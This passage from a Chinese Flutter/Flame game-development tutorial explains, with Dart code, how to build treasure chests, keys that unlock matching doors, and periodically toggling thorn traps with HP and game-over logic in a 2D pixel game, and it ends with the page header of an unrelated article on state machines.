      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> obj <span class="hljs-keyword">in</span> treasureLayer.objects) {
        <span class="hljs-keyword">if</span> (obj.properties[<span class="hljs-string">'type'</span>]?.value == <span class="hljs-string">'treasure'</span>) {
          <span class="hljs-keyword">final</span> status = obj.properties[<span class="hljs-string">'status'</span>]!.value <span class="hljs-keyword">as</span> <span class="hljs-built_in">String</span>;
          <span class="hljs-keyword">final</span> x = mapScale * obj.x;
          <span class="hljs-keyword">final</span> y = mapScale * obj.y;
          <span class="hljs-keyword">final</span> w = mapScale * obj.width;
          <span class="hljs-keyword">final</span> h = mapScale * obj.height;
          <span class="hljs-keyword">final</span> treasureComponent = TreasureComponent(
            status: status,
            position: Vector2(x, y),
            size: Vector2(w, h),
          );
          treasureComponent.debugMode = <span class="hljs-keyword">true</span>;
          <span class="hljs-keyword">await</span> world.add(treasureComponent);
        }
      }
    }
</code></pre>
<h3 data-id="heading-23">六. 钥匙与门 - 验证交互式解锁</h3>
 <img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c641f2a2275348e8866403f6534892c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=gAK8%2FQYRh0GFgSYgXeZUqpDqKw8%3D" width="49%" height="400" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7133938e4b304827b8ca75f87d655cf1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=FyjsdzJOwUFBFzlbEmjgs9ZhkVQ%3D" width="49%" height="400" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b0495310526464485e1c9172960dfce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=gCxZLyGeUignUPz%2ByLTpB9cC1zU%3D" width="100%" loading="lazy"/>
<h4 data-id="heading-24">1. 简述</h4>
<p><strong>钥匙与门</strong> 是一组具备条件验证的交互对象，通过 <code>拾取钥匙 → 解锁对应门</code> 实现地图通行控制。</p>
<ul>
<li>
<p><strong>继承关系</strong>：门继承碰撞基类，当门未打开时具备阻挡能力，与墙体或水面碰撞逻辑一致</p>
</li>
<li>
<p><strong>钥匙</strong>：可拾取对象，角色接触后获得对应 <code>keyId</code></p>
</li>
<li>
<p><strong>门</strong>：阻挡地图通行，需角色持有匹配钥匙才能打开</p>
</li>
<li>
<p><strong>交互逻辑</strong>：</p>
<ul>
<li>角色与门交互时，判断是否持有匹配钥匙</li>
<li>条件满足时门打开，否则保持阻挡状态</li>
</ul>
</li>
</ul>
<h4 data-id="heading-25">2. Tiled 前置工作</h4>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36dbd7a9048848699cfcd6dd843995b0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=lnUwELyjabfpaotBegCyvbdVAOE%3D" width="100%" loading="lazy"/>
<ol>
<li>新建两个 <code>Object Layer</code> 图层，分别命名为 <code>key</code>、<code>door</code>。</li>
<li>点击使用上方矩形框选工具。</li>
<li>在地图中所需位置，正确绘制钥匙和门大小的矩形。</li>
<li>添加属性：</li>
</ol>
<ul>
<li><code>钥匙</code>：
<ul>
<li>type：<strong>key</strong></li>
<li>keyId：对应指定的钥匙与门</li>
</ul>
</li>
<li><code>门</code>：
<ul>
<li>type：<strong>door</strong></li>
<li>keyId：对应指定的钥匙与门</li>
<li>status：表示 <strong>门状态</strong>，一共有两种：<strong>closed（关闭）</strong>、<strong>open（打开）</strong></li>
<li/>
</ul>
</li>
</ul>
<h4 data-id="heading-26">3. 构建钥匙类</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// key_component.dart</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KeyComponent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SpriteComponent</span>
    <span class="hljs-title">with</span> <span class="hljs-title">HasGameReference</span>&lt;<span class="hljs-title">MyGame</span>&gt;, <span class="hljs-title">CollisionCallbacks</span> </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> keyId;

  KeyComponent({
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.keyId,
    <span class="hljs-keyword">required</span> Vector2 position,
    <span class="hljs-keyword">required</span> Vector2 size,
  }) : <span class="hljs-keyword">super</span>(position: position, size: size);

  <span class="hljs-meta">@override</span>
  Future&lt;<span class="hljs-keyword">void</span>&gt; onLoad() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">await</span> <span class="hljs-keyword">super</span>.onLoad();
    sprite = <span class="hljs-keyword">await</span> Sprite.load(<span class="hljs-string">'key.png'</span>); <span class="hljs-comment">// 直接加载 assets/key.png</span>
    add(RectangleHitbox());
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> onCollisionStart(<span class="hljs-built_in">Set</span>&lt;Vector2&gt; intersectionPoints, PositionComponent other) {
    <span class="hljs-keyword">super</span>.onCollisionStart(intersectionPoints, other);
    <span class="hljs-keyword">if</span> (other <span class="hljs-keyword">is</span> HeroComponent) {
      other.addKey(keyId);
      removeFromParent(); <span class="hljs-comment">// 拾取后移除当前 tile</span>
    }
  }
}
</code></pre>
<p><code>KeyComponent</code> 作为<strong>可拾取的钥匙实体</strong>，用于角色解锁对应门：</p>
<ul>
<li>
<p><strong>继承 <code>SpriteComponent</code> + 碰撞回调</strong></p>
<ul>
<li>具备位置、尺寸和碰撞检测能力</li>
</ul>
</li>
<li>
<p><strong>钥匙标识 <code>keyId</code></strong></p>
<ul>
<li>用于与门的 <code>keyId</code> 对应，实现解锁验证</li>
</ul>
</li>
<li>
<p><strong>碰撞拾取逻辑</strong></p>
<ul>
<li>当角色碰到钥匙：<br/>
将 <code>keyId</code> 存入角色钥匙集合<br/>
从地图中移除钥匙实体，避免重复拾取</li>
</ul>
</li>
</ul>
<h4 data-id="heading-27">4. 构建门类</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// door_component.dart</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DoorComponent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BlockerComponent</span> <span class="hljs-title">with</span> <span class="hljs-title">HasGameReference</span>&lt;<span class="hljs-title">MyGame</span>&gt; </span>{
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> keyId;
  <span class="hljs-built_in">bool</span> isOpen;

  DoorComponent({
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.keyId,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.isOpen,
    <span class="hljs-keyword">super</span>.position,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">super</span>.size,
  }) : <span class="hljs-keyword">super</span>(
    addHitbox: !isOpen);

  <span class="hljs-meta">@override</span>
  Future&lt;<span class="hljs-keyword">void</span>&gt; onLoad() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">await</span> <span class="hljs-keyword">super</span>.onLoad();
    sprite = <span class="hljs-keyword">await</span> Sprite.load(isOpen ? <span class="hljs-string">'open_door.png'</span> : <span class="hljs-string">'closed_door.png'</span>);
  }

  <span class="hljs-keyword">void</span> _unlock() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (!isOpen) {
      isOpen = <span class="hljs-keyword">true</span>;
      sprite = <span class="hljs-keyword">await</span> Sprite.load(<span class="hljs-string">'open_door.png'</span>);
      hitbox.removeFromParent();
    }
  }

  <span class="hljs-keyword">void</span> attemptOpen(HeroComponent hero) {
    <span class="hljs-keyword">if</span> (!isOpen &amp;&amp; hero.hasKey(keyId)) {
      unlock();
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!isOpen) {
      UiNotify.showToast(game, <span class="hljs-string">'需要钥匙 <span class="hljs-subst">$keyId</span> 才能打开'</span>);
    }
  }
}
</code></pre>
<p><code>DoorComponent</code> 作为门的实体类，主要职责是 <strong>阻挡角色通行并支持钥匙验证解锁</strong>：</p>
<ul>
<li>
<p><strong>继承 <code>BlockerComponent</code></strong></p>
<ul>
<li>默认有碰撞体阻挡角色</li>
<li>可根据 <code>isOpen</code> 状态决定是否添加碰撞体</li>
</ul>
</li>
<li>
<p><strong>状态管理</strong></p>
<ul>
<li><code>isOpen = false</code>：门关闭，阻挡角色</li>
<li><code>isOpen = true</code>：门打开，移除碰撞体，允许角色通过</li>
</ul>
</li>
<li>
<p><strong>钥匙验证逻辑</strong></p>
<ul>
<li>
<p><code>attemptOpen(hero)</code>：当角色接触门时触发</p>
<ul>
<li>如果角色持有匹配 <code>keyId</code>，调用 <code>_unlock()</code> 打开门</li>
<li>否则弹出提示，告知需要钥匙</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>视图更新</strong></p>
<ul>
<li>根据门状态动态加载不同贴图（<code>open_door.png</code> / <code>closed_door.png</code>）</li>
<li>打开时同步移除碰撞体，保证角色能通过</li>
</ul>
</li>
</ul>
<h4 data-id="heading-28">5. 加载钥匙与门</h4>
<pre><code class="hljs language-dart" lang="dart">    <span class="hljs-comment">// my_game.dart</span>

    <span class="hljs-comment">// ---- 处理 Key Layer 中的钥匙 ----</span>
    <span class="hljs-keyword">final</span> keyLayer = tiled.tileMap.getLayer&lt;ObjectGroup&gt;(<span class="hljs-string">'key'</span>);
    <span class="hljs-keyword">if</span> (keyLayer != <span class="hljs-keyword">null</span>) {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> obj <span class="hljs-keyword">in</span> keyLayer.objects) {
        <span class="hljs-keyword">if</span> (obj.properties[<span class="hljs-string">'type'</span>]?.value == <span class="hljs-string">'key'</span>) {
          <span class="hljs-keyword">final</span> keyId = obj.properties[<span class="hljs-string">'keyId'</span>]!.value <span class="hljs-keyword">as</span> <span class="hljs-built_in">String</span>;
          <span class="hljs-keyword">final</span> x = mapScale * obj.x;
          <span class="hljs-keyword">final</span> y = mapScale * obj.y;
          <span class="hljs-keyword">final</span> w = mapScale * obj.width;
          <span class="hljs-keyword">final</span> h = mapScale * obj.height;
          <span class="hljs-keyword">final</span> keyComponent = KeyComponent(
            keyId: keyId,
            <span class="hljs-comment">// Tiled 对象坐标为左上或底对齐；这里使用底对齐放置更符合 tile 外观</span>
            position: Vector2(x, y),
            size: Vector2(w, h),
          );
          keyComponent.debugMode = <span class="hljs-keyword">true</span>;
          <span class="hljs-keyword">await</span> world.add(keyComponent);
        }
      }
    }
    
    <span class="hljs-comment">// ---- 处理 Door Layer 中的门 ----</span>
    <span class="hljs-keyword">final</span> doorLayer = tiled.tileMap.getLayer&lt;ObjectGroup&gt;(<span class="hljs-string">'door'</span>);
    <span class="hljs-keyword">if</span> (doorLayer != <span class="hljs-keyword">null</span>) {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> obj <span class="hljs-keyword">in</span> doorLayer.objects) {
        <span class="hljs-keyword">if</span> (obj.properties[<span class="hljs-string">'type'</span>]?.value == <span class="hljs-string">'door'</span>) {
          <span class="hljs-keyword">final</span> keyId = obj.properties[<span class="hljs-string">'keyId'</span>]!.value <span class="hljs-keyword">as</span> <span class="hljs-built_in">String</span>;
          <span class="hljs-keyword">final</span> x = mapScale * obj.x;
          <span class="hljs-keyword">final</span> y = mapScale * obj.y;
          <span class="hljs-keyword">final</span> w = mapScale * obj.width;
          <span class="hljs-keyword">final</span> h = mapScale * obj.height;
          <span class="hljs-keyword">final</span> doorComponent = DoorComponent(
            keyId: keyId,
            isOpen: obj.properties[<span class="hljs-string">'status'</span>]?.value == <span class="hljs-string">'open'</span> ? <span class="hljs-keyword">true</span> : <span class="hljs-keyword">false</span>,
            <span class="hljs-comment">// Tiled 对象坐标为左上或底对齐；这里使用底对齐放置更符合 tile 外观</span>
            position: Vector2(x, y),
            size: Vector2(w, h),
          );
          doorComponent.debugMode = <span class="hljs-keyword">true</span>;
          <span class="hljs-keyword">await</span> world.add(doorComponent);
        }
      }
    }
</code></pre>
<h4 data-id="heading-29">6. 完善逻辑</h4>
<p>在 <code>HeroComponent</code> 中，为角色添加 <strong>钥匙管理与门验证</strong> 功能：</p>
<h5 data-id="heading-30">(1). 钥匙管理</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">final</span> <span class="hljs-built_in">Set</span>&lt;<span class="hljs-built_in">String</span>&gt; keys = {};
</code></pre>
<ul>
<li>存储角色已拾取的钥匙 <code>keyId</code> 集合</li>
</ul>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">void</span> addKey(<span class="hljs-built_in">String</span> keyId) {
  keys.add(keyId);
  UiNotify.showToast(game, <span class="hljs-string">'获得钥匙: <span class="hljs-subst">$keyId</span>'</span>);
}
</code></pre>
<ul>
<li>角色拾取钥匙时调用</li>
<li>弹出提示通知玩家获得钥匙</li>
</ul>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-built_in">bool</span> hasKey(<span class="hljs-built_in">String</span> keyId) =&gt; keys.contains(keyId);
</code></pre>
<ul>
<li>判断角色是否持有指定钥匙</li>
<li>用于门解锁验证</li>
</ul>
<hr/>
<h5 data-id="heading-31">(2). 门交互逻辑</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> door <span class="hljs-keyword">in</span> game.world.children.query&lt;DoorComponent&gt;()) {
  <span class="hljs-keyword">if</span> (!door.isOpen &amp;&amp; door.collidesWith(heroRect)) {
    door.attemptOpen(<span class="hljs-keyword">this</span>);
    <span class="hljs-keyword">if</span> (!door.isOpen) <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
  }
}
</code></pre>
<p>在角色移动碰撞检测 <code>_wouldCollideWithBlockers()</code> 中：</p>
<ul>
<li>遍历所有门组件</li>
<li>检测角色是否与关闭的门发生碰撞</li>
<li>调用 <code>door.attemptOpen(this)</code> 尝试解锁</li>
<li>如果门仍未打开，则返回阻挡信息，阻止角色移动</li>
</ul>
<h3 data-id="heading-32">七. 地刺</h3>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7165f8043a14465a8da56a9feef4d515~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=Pj4UfE5HRi3HYs5Q%2FD%2FusulKy58%3D" width="100%" loading="lazy"/>
<h4 data-id="heading-33">1. 简述</h4>
<p><strong>地刺</strong> 是一种周期性造成伤害的地图障碍，通过状态切换形成完整的伤害与死亡判定逻辑。</p>
<ul>
<li>
<p><strong>继承关系</strong>：无需继承碰撞基类</p>
</li>
<li>
<p><strong>功能</strong>：对接触的角色造成伤害</p>
</li>
<li>
<p><strong>状态</strong>：突出与收起两种状态，周期性切换</p>
</li>
<li>
<p><strong>交互逻辑</strong>：</p>
<ul>
<li>角色接触突出状态的地刺会受到伤害</li>
<li>触发死亡判定后可触发游戏重启或复活逻辑</li>
<li>周期性切换状态增强地图挑战性</li>
</ul>
</li>
</ul>
<h4 data-id="heading-34">2. Tiled 前置工作</h4>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cfe89b0efc2d4f618ece0cb8e2edcab1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=dk%2Fr6O95jcLYO8PkaEdBnVqiIu8%3D" width="100%" loading="lazy"/>
<ol>
<li>新建 <code>Object Layer</code> 图层，命名为 <code>thorn</code>。</li>
<li>点击使用上方矩形框选工具。</li>
<li>在地图中所需位置，正确绘制地刺大小的矩形。</li>
<li>添加属性：</li>
</ol>
<ul>
<li>type：<strong>thorn</strong></li>
<li>status：表示 <strong>地刺状态</strong>，一共有两种：<strong>on（突出）</strong>、<strong>off（收入）</strong></li>
</ul>
<h4 data-id="heading-35">3. 构建地刺类</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// thorn_component.dart</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ThornComponent</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">SpriteComponent</span>
    <span class="hljs-title">with</span> <span class="hljs-title">HasGameReference</span>&lt;<span class="hljs-title">MyGame</span>&gt;, <span class="hljs-title">CollisionCallbacks</span> </span>{
  <span class="hljs-built_in">String</span> status;
  <span class="hljs-keyword">late</span> RectangleHitbox _hitbox;

  <span class="hljs-built_in">double</span> _elapsed = <span class="hljs-number">0</span>;
  <span class="hljs-built_in">double</span> period = <span class="hljs-number">2.0</span>;
  <span class="hljs-built_in">bool</span> hurted = <span class="hljs-keyword">false</span>;
  ThornComponent({<span class="hljs-keyword">super</span>.position, <span class="hljs-keyword">required</span> <span class="hljs-keyword">super</span>.size, <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.status});

  <span class="hljs-meta">@override</span>
  Future&lt;<span class="hljs-keyword">void</span>&gt; onLoad() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">await</span> <span class="hljs-keyword">super</span>.onLoad();
    sprite = <span class="hljs-keyword">await</span> Sprite.load(
      status == <span class="hljs-string">'on'</span> ? <span class="hljs-string">'thorn_on.png'</span> : <span class="hljs-string">'thorn_off.png'</span>,
    );
    _hitbox = RectangleHitbox();
    add(_hitbox);
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> onCollisionStart(
    <span class="hljs-built_in">Set</span>&lt;Vector2&gt; intersectionPoints,
    PositionComponent other,
  ) {
    <span class="hljs-keyword">super</span>.onCollisionStart(intersectionPoints, other);
    <span class="hljs-keyword">if</span> (other <span class="hljs-keyword">is</span> HeroComponent) {
      attemptDamage(other);
    }
  }

  <span class="hljs-keyword">void</span> attemptDamage(HeroComponent hero) {
    <span class="hljs-keyword">if</span> (status == <span class="hljs-string">'on'</span> &amp;&amp; !hurted) {
      hero.loseHp(<span class="hljs-number">1</span>);
      hurted = <span class="hljs-keyword">true</span>;
    }
  }

  <span class="hljs-keyword">void</span> _toggle() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (status == <span class="hljs-string">'on'</span>) {
      status = <span class="hljs-string">'off'</span>;
    } <span class="hljs-keyword">else</span> {
      status = <span class="hljs-string">'on'</span>;
      hurted = <span class="hljs-keyword">false</span>;
    }
    sprite = <span class="hljs-keyword">await</span> Sprite.load(
      status == <span class="hljs-string">'on'</span> ? <span class="hljs-string">'thorn_on.png'</span> : <span class="hljs-string">'thorn_off.png'</span>,
    );
  }

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> update(<span class="hljs-built_in">double</span> dt) {
    <span class="hljs-keyword">super</span>.update(dt);
    _elapsed += dt;
    <span class="hljs-keyword">if</span> (_elapsed &gt;= period) {
      _elapsed = <span class="hljs-number">0</span>;
      _toggle();
    }
  }
}

</code></pre>
<p><code>ThornComponent</code> 负责地刺的<strong>显示、周期切换和伤害逻辑</strong>：</p>
<ul>
<li>
<p><strong>继承 <code>SpriteComponent</code> + 碰撞回调</strong></p>
<ul>
<li>具备位置、尺寸和碰撞检测能力</li>
</ul>
</li>
<li>
<p><strong>状态管理</strong></p>
<ul>
<li><code>on</code>：突出，触碰造成伤害</li>
<li><code>off</code>：收起，不造成伤害</li>
</ul>
</li>
<li>
<p><strong>伤害逻辑</strong></p>
<ul>
<li><code>attemptDamage(hero)</code>：保证每周期只造成一次伤害</li>
</ul>
</li>
<li>
<p><strong>周期切换</strong></p>
<ul>
<li><code>_toggle()</code> 在固定 <code>period</code> 时间间隔内切换状态，并更新贴图</li>
</ul>
</li>
</ul>
<h4 data-id="heading-36">4. 加载地刺</h4>
<pre><code class="hljs language-dart" lang="dart">    <span class="hljs-comment">// my_game.dart</span>
    
    <span class="hljs-comment">// ---- 处理 thorn 中的荆棘 ----</span>
    <span class="hljs-keyword">final</span> thornLayer = tiled.tileMap.getLayer&lt;ObjectGroup&gt;(<span class="hljs-string">'thorn'</span>);
    <span class="hljs-keyword">if</span> (thornLayer != <span class="hljs-keyword">null</span>) {
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> obj <span class="hljs-keyword">in</span> thornLayer.objects) {
        <span class="hljs-keyword">if</span> (obj.properties[<span class="hljs-string">'type'</span>]?.value == <span class="hljs-string">'thorn'</span>) {
          <span class="hljs-keyword">final</span> status = obj.properties[<span class="hljs-string">'status'</span>]!.value <span class="hljs-keyword">as</span> <span class="hljs-built_in">String</span>;
          <span class="hljs-keyword">final</span> x = mapScale * obj.x;
          <span class="hljs-keyword">final</span> y = mapScale * obj.y;
          <span class="hljs-keyword">final</span> w = mapScale * obj.width;
          <span class="hljs-keyword">final</span> h = mapScale * obj.height;
          <span class="hljs-keyword">final</span> thornComponent = ThornComponent(
            status: status,
            position: Vector2(x, y),
            size: Vector2(w, h),
          );
          thornComponent.debugMode = <span class="hljs-keyword">true</span>;
          <span class="hljs-keyword">await</span> world.add(thornComponent);
        }
      }
    }
</code></pre>
<h4 data-id="heading-37">5. 完善逻辑</h4>
<p>在 <code>HeroComponent</code> 中, 实现了角色 <strong>生命值管理 + 死亡判定</strong> 的功能：</p>
<ul>
<li>
<p>增加 <code>hp</code> 属性，记录角色生命值</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 生命值</span>
<span class="hljs-built_in">int</span> hp = <span class="hljs-number">5</span>;
</code></pre>
</li>
<li>
<p><code>loseHp(amount)</code>：被地刺等障碍伤害时调用，扣除生命值并显示提示</p>
<pre><code class="hljs language-dart" lang="dart"> <span class="hljs-keyword">void</span> loseHp(<span class="hljs-built_in">int</span> amount) {
     hp = hp - amount;
     <span class="hljs-keyword">if</span> (hp &lt;= <span class="hljs-number">0</span>) {
       UiNotify.showToast(game, <span class="hljs-string">'死亡'</span>);
     } <span class="hljs-keyword">else</span> {
       UiNotify.showToast(game, <span class="hljs-string">'HP -<span class="hljs-subst">$amount</span>  剩余 <span class="hljs-subst">$hp</span>'</span>);
     }
 }
</code></pre>
</li>
<li>
<p>当 <code>hp &lt;= 0</code>：触发 <code>gameOver()</code></p>
<ul>
<li>播放死亡动画</li>
<li>2 秒后显示重新开始弹窗</li>
</ul>
<pre><code class="hljs language-dart" lang="dart">  Future&lt;<span class="hljs-keyword">void</span>&gt; gameOver() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">if</span> (_isGameOver) <span class="hljs-keyword">return</span>;
    _isGameOver = <span class="hljs-keyword">true</span>;

    <span class="hljs-comment">// 播放死亡动画</span>
    <span class="hljs-keyword">if</span> (animations.containsKey(HeroState.dead)) {
      _setState(HeroState.dead);
    }

    <span class="hljs-comment">// 等待 2 秒，让死亡动画播放</span>
    <span class="hljs-keyword">await</span> Future.delayed(<span class="hljs-keyword">const</span> <span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">2</span>));

    <span class="hljs-comment">// 显示重新开始弹窗</span>
    <span class="hljs-keyword">final</span> exists = game.camera.viewport.children
        .query&lt;RestartOverlay&gt;()
        .isNotEmpty;
    <span class="hljs-keyword">if</span> (!exists) {
      game.camera.viewport.add(RestartOverlay());
    }
  }
</code></pre>
</li>
</ul>
<h3 data-id="heading-38">八. 总结与展望</h3>
<h4 data-id="heading-39">总结</h4>
<p>本章主要介绍了 <strong>Flutter&amp;Flame</strong> 开发 <strong>2D像素游戏</strong> 关于 <code>人物与地图元素交互</code> 的基础实践。<br/>
通过上述步骤，我们完成了<code>宝箱、钥匙、门 和 地刺</code> 这几类常见元素的交互 。</p>
<p>截至目前为止，游戏主要包括了以下内容：</p>
<ul>
<li><strong>角色与动画</strong>：使用精灵图 (<code>SpriteSheet</code>) 创建角色，支持 idle/run 等动画状态切换。</li>
<li><strong>玩家交互</strong>：通过摇杆控制角色移动，并根据方向翻转动画。</li>
<li><strong>地图加载</strong>：通过 <code>Tiled</code> 绘制并在 <strong>Flame</strong> 中加载的 <strong>2d像素地图</strong>。</li>
<li><strong>地图交互</strong>：通过组件化模式，新建了多个可供交互的组件如（<strong>门、钥匙、宝箱、地刺</strong>），为游戏增加了互动性。</li>
<li><strong>统一碰撞区检测</strong>：将角色与 <strong>需要产生碰撞</strong> 的物体统一管理，并实现碰撞时的 <strong>平滑侧移</strong>。</li>
</ul>
<h4 data-id="heading-40">展望</h4>
<ul>
<li>
<p>思考 🤔 一个有趣的游戏机制ing ...</p>
</li>
<li>
<p>完成攻击与技能系统，包括动画切换、攻击范围和远程弹道。</p>
</li>
<li>
<p>实现怪物生成、自动攻击与玩家碰撞逻辑。</p>
</li>
<li>
<p>支持局域网多玩家联机功能。</p>
</li>
</ul>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTheSyart%2Fmyhero" target="_blank" title="https://github.com/TheSyart/myhero" ref="nofollow noopener noreferrer">🚪 github 源码</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.shanchen.space" target="_blank" title="https://www.shanchen.space" ref="nofollow noopener noreferrer">💻 个人门户网站</a></p>
</blockquote>
<hr/>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48d840c0943b48dc974afc9d4952fefd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgX-Wkp-WtpueJsg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766474758&amp;x-signature=GWSVzBzfNRh6Jy7VO4lICC%2FHyq4%3D" width="100%" loading="lazy"/></p><p/>
<p align="center"><i>之前尝试的Demo预览</i></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[为什么你的if-else越写越乱？聊聊状态机]]></title>    <link>https://juejin.cn/post/7584037286028754994</link>    <guid>https://juejin.cn/post/7584037286028754994</guid>    <pubDate>2025-12-16T07:34:19.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584037286028754994" data-draft-id="7584110439932985390" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="为什么你的if-else越写越乱？聊聊状态机"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-16T07:34:19.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="dob"/> <meta itemprop="url" content="https://juejin.cn/user/3336393282826651"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            为什么你的if-else越写越乱？聊聊状态机
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3336393282826651/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    dob
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:34:19.000Z" title="Tue Dec 16 2025 07:34:19 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
